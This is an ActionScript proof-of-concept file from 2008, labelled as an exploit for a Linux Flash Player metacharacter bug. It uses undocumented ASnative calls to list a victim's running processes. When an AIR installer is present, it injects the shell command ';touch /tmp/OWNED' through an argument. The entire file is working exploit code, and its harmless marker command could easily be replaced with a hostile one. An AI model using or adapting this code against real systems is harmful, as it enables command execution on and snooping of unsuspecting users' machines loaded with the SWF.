/* 
   Simple exploit for Linux Flash Player metachar bug 

    Miami Beach
    12/30/2008
    
    mtasc -swf launch.swf -main -header 800:600:20 launch.as
*/

class Launcher {
    
    static var doit : Launcher;

    function Launcher() {

        _root.createTextField("tf", 0, 0, 0, 800, 600);

/*
ASNative(2201, 0)(arg) -> popen("ps x | grep arg")
NOTE: fgets safe, metachar filtered

This lets me check your process listings for anything.
*/
        if(!_global.ASnative(2201, 0)("wingide")) {
            _root.tf.text = "Get to work!";
        }
        else {
            _root.tf.text = "All work and no play ...";
        }

/* if airappinstaller is installed, then hilarity ensues */

      if (_global.ASnative(2201, 1)("airappinstaller")) {
            _global.ASnative(2201, 2)("airappinstaller", ";touch /tmp/OWNED");
            _root.tf.text = "Check /tmp/OWNED :X";
      }
    }   
     
    static function main(mc) {
        var doit = new Launcher();
    }
}
